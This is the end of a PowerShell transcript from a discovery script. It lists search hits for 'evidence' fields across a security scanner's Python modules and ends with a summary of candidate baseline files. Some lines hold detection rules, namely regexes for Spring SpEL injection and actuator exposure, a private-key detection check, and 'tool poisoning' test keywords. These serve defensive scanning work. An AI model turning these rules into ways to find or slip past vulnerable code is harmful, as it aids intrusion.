+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\apibom.py:271 | evidence: str,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\apibom.py:289 | "evidence": evidence.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\apibom.py:321 | evidence = lines[line_no - 1] if 0 <= line_no - 1 < len(lines) else ""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\apibom.py:323 | if evidence.lstrip().startswith(("#", "//", "*")):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\apibom.py:337 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:155 | def _make_cbom_item(rule: dict, filepath: str, line: int, evidence: str) -> dict:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:162 | "evidence": evidence.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:168 | def _extract_evidence(source: str, match, max_chars: int = 2000) -> str:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:213 | evidence = _extract_evidence(source, match)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:217 | and "-----BEGIN " in evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:218 | and "PRIVATE KEY-----" in evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\cbom.py:227 | evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\change_impact.py:3 | Builds deterministic file/module impact evidence from changed files and existing
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\finding_lifecycle_intelligence.py:9 | - explicit lifecycle evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\finding_lifecycle_intelligence.py:16 | - UNCHANGED: matching finding exists in both and no explicit state transition is evidenced.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\finding_lifecycle_intelligence.py:105 | # No stable identity evidence exists. Do not silently create a
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\finding_lifecycle_intelligence.py:225 | # Reintroduction/regression requires explicit historical state evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_docker.py:255 | "evidence": snippet.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_kubernetes.py:261 | "evidence": snippet.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_kubernetes.py:475 | # Locate the actual container name for useful evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_terraform.py:290 | "evidence": snippet.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:39 | evidence: str | None = None,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:51 | "evidence": evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:114 | evidence=line.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:132 | evidence=line.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:212 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:237 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:293 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:316 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:503 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:535 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:568 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_taint_engine_v10.py:631 | evidence=stripped,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:110 | """Return a rule-aware evidence context radius."""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:388 | evidence_context = f"{snippet}\n{nearby}"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:421 | if not LLM_CONTEXT_TERMS.search(evidence_context):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:425 | SENSITIVE_TERMS.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:431 | evidence_context,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:444 | evidence_context,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:447 | and SENSITIVE_TERMS.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:458 | LLM_CONTEXT_TERMS.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:459 | and SENSITIVE_TERMS.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:465 | # evidence; an ordinary email variable is insufficient.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:471 | EMAIL_SEND.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:472 | and SENSITIVE_TERMS.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:473 | and LLM_CONTEXT_TERMS.search(evidence_context)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:485 | if not LLM_CONTEXT_TERMS.search(evidence_context):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:491 | elif not REAL_EXECUTION_SINK.search(evidence_context):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:715 | "Return an explicit insufficient-evidence response when retrieval confidence is low.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:722 | "Return an explicit insufficient-evidence response when retrieval confidence is low.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:787 | "Include model digest, version, source, owner, and approval status in release evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:834 | "Record approver, approval date, model version, evaluation evidence, and release scope.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:840 | "Record compliance evidence and risk acceptance decisions in the release package.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:852 | "Generate SBOM/AI-BOM evidence for AI dependencies, models, plugins, and tools.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:883 | "rag_no_source_grounding": "RAG output is not required to cite or ground answers in trusted retrieved evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:923 | "rag_untrusted_retrieval": "Untrusted retrieval can introduce malicious instructions, inaccurate evidence, or data leakage paths.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:942 | "model_approval_missing": "Missing model approval weakens release controls and audit evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:1107 | # Specific controls own evidence over broader generic controls.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\malicious_package_intelligence.py:4 | Adds evidence aggregation for package reputation/advisory indicators already
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\malicious_package_intelligence.py:26 | "evidence_count":len(indicators),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:271 | evidence: str,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:282 | "evidence": evidence.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:313 | evidence = lines[line_no - 1] if 0 <= line_no - 1 < len(lines) else ""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:315 | if evidence.lstrip().startswith(("#", "//", "*")):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:335 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:354 | item.get("evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\pr_review_integration.py:24 | "review_comment":"Security finding detected on changed code; review the finding evidence before merge.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\pr_security_summary.py:3 | Aggregates existing evidence without inventing risk or lifecycle conclusions.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\pr_security_summary.py:22 | "Lifecycle states require baseline evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\pr_security_summary.py:24 | "Change impact is static evidence and does not establish runtime reachability.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:170 | # A Java import is evidence only when it identifies the package's
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:230 | pkg["reachability_evidence_type"] = "STATIC_IMPORT_REFERENCE"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:231 | pkg["reachability_evidence"] = [
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:241 | pkg["reachability_evidence_type"] = "STATIC_MANIFEST_DECLARATION"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:242 | pkg["reachability_evidence"] = [
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:252 | pkg["reachability_evidence_type"] = "NO_STATIC_REFERENCE_OBSERVED"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:253 | pkg["reachability_evidence"] = []
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:183 | # server-side route evidence so frontend navigation/API references do not fire.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:206 | # ---- Big4 enterprise gap patch: rule hardening, evidence targeting, controls ----
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:241 | "SPRING_SPEL_INJECTION": {"pat": r"parseExpression\s*\([^)]*(?:request|getParameter|@RequestParam|@PathVariable|param|input)|SpelExpressionParser[\s\S]{0,240}parseExpression\s*\(", "evidence_pat": r"parseExpression\s*\("},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:242 | "SPRING_ACTUATOR_EXPOSE_ALL": {"pat": r"management\.endpoints\.web\.exposure\.include\s*[:=]\s*[\"']?\*[\"']?|exposure:\s*\n\s*include:\s*[\"']?\*[\"']?", "evidence_pat": r"include\s*[:=]\s*[\"']?\*[\"']?"},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:352 | """Return True only for a language-valid comment-only evidence snippet."""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:375 | the selected evidence line is unsafe. This lightweight lexical scan tracks
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:485 | """Return the most meaningful evidence line for a multiline rule match."""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:486 | evidence_pat = rule.get("evidence_pat")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:488 | if evidence_pat:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:489 | em = re.search(evidence_pat, segment, re.IGNORECASE | re.MULTILINE | re.DOTALL)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:886 | "evidence": f"{filepath}:{lineno}: {snippet}",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\secret_intelligence.py:149 | "evidence": f"{file}:{line}: {snippet.strip()}",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\secret_intelligence.py:856 | detection       = static evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\security_change_graph.py:3 | Creates a deterministic evidence graph from already-produced change, finding,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\security_test_coverage.py:3 | Conservative candidate-test evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\security_test_coverage.py:113 | """Return conservative candidate-test evidence without mutating payload."""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\security_test_coverage.py:141 | "candidate_test_evidence": bool(related),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\security_test_coverage.py:157 | if row["candidate_test_evidence"]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\security_test_generator.py:48 | Derive a conservative test strategy from rule/CWE evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:265 | "evidence": f"{filepath}:{line}: {snippet.strip()}", "detection": "Enterprise Source-to-Sink Heuristic", "engine": "scanner.taint_engine", "cvss": None, "cve": None,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:275 | # not evidence that the backend endpoint lacks rate limiting.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:326 | """Return True only when the file provides credible server route evidence."""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:333 | # Generic frontend indicators should not become endpoint evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:366 | """Return True when SSRF evidence comes from browser/client-side code.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:675 | # Look in nearby windows, but report the sink line as evidence to avoid
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:689 | # API rate-limit rules require server-side route evidence. A frontend
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:742 | evidence_line = concrete + 1
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:799 | evidence_line = concrete_candidate + 1
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:816 | evidence_line,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:851 | "evidence": f"{tf.file}:{tf.line}: {snippet}", "detection": "AST Taint Analysis", "engine": "scanner.taint_engine", "cvss": None, "cve": None,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:1043 | 'evidence': f'{filepath}:{line_no}: {snippet.strip()}',
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:1338 | 'evidence': f'{filepath}:{line_no}: {snippet.strip()}',
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:1464 | 'evidence': f'{filepath}:{line_no}: {snippet.strip()}',
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\undeclared_dependency_intelligence.py:14 | version/CVE/EPSS/KEV/reachability evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\undeclared_dependency_intelligence.py:366 | "evidence_type": "STATIC_SOURCE_IMPORT",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\undeclared_dependency_intelligence.py:402 | # Keep this as a separate evidence collection. Existing vulnerability
+[Evidence] D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.csv:1 | "Check","Status","Evidence"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.csv:16 | "Production call-chain source evidence","PASS","Expected main -> SAST -> taint source symbols present"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.csv:19 | "Existing validation evidence discovery","PASS","5 candidate evidence files found"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.txt:39 | [PASS] Production call-chain source evidence - Expected main -> SAST -> taint source symbols present
+[Evidence] D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.txt:42 | [PASS] Existing validation evidence discovery - 5 candidate evidence files found
+[QualifiedEvidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:148 | 'QualifiedEvidence',
+[QualifiedEvidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:122 | 'QualifiedEvidence',
+[EvidenceProvenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:149 | 'EvidenceProvenance'
+[EvidenceProvenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:124 | 'EvidenceProvenance',
+
+--- Graph / agent / MCP / RAG test references ---
+[AGENT_GRAPH] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:173 | 'AGENT_GRAPH',
+[AGENT_GRAPH] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:132 | 'AGENT_GRAPH',
+[MCP_GRAPH] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:174 | 'MCP_GRAPH',
+[MCP_GRAPH] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:133 | 'MCP_GRAPH',
+[RAG_GRAPH] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:175 | 'RAG_GRAPH',
+[RAG_GRAPH] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:134 | 'RAG_GRAPH',
+[agent graph] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:176 | 'agent graph',
+[mcp graph] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:177 | 'mcp graph',
+[rag graph] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:178 | 'rag graph',
+[tool poisoning] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:179 | 'tool poisoning',
+[tool-poisoning] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:180 | 'tool-poisoning',
+[ASI02] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:181 | 'ASI02',
+[ASI02] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:136 | 'ASI02',
+[ASI04] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:182 | 'ASI04'
+[ASI04] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:137 | 'ASI04'
+
+--- Existing model/schema/evidence candidates ---
+D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py
+D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py
+D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py
+D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py
+D:\data\Code test\r-SecOpsX_V11\analysis\exploitability_decision_engine.py
+D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py
+D:\data\Code test\r-SecOpsX_V11\analysis\npm_lock_graph_v2.py
+D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py
+D:\data\Code test\r-SecOpsX_V11\core\benchmark_evidence_validation_v1.py
+D:\data\Code test\r-SecOpsX_V11\core\finding_model.py
+D:\data\Code test\r-SecOpsX_V11\scanner\finding_lifecycle_intelligence.py
+D:\data\Code test\r-SecOpsX_V11\scanner\historical_finding_intelligence.py
+D:\data\Code test\r-SecOpsX_V11\scanner\security_change_graph.py
+
+============================================================
+ DISCOVERY SUMMARY
+============================================================
+All files                    : 149
+Candidate test/config files  : 16
+Python test files            : 0
+Model/schema candidates      : 13
+Evidence rows                : 1033
+Likely baseline files        : 105
+Report                       : D:\data\Code test\r-SecOpsX_V11\Working folder\Evidence_Schema_Discovery\V11_Corrected_Test_Discovery_20261002-162306.txt
+CSV                          : D:\data\Code test\r-SecOpsX_V11\Working folder\Evidence_Schema_Discovery\V11_Corrected_Test_Discovery_20261002-162306.csv
+
+STATUS: DISCOVERY_COMPLETE - candidate baseline files identified
+No production source files were modified.
+**********************
+Windows PowerShell transcript end
+End time: 20261002162313
+**********************
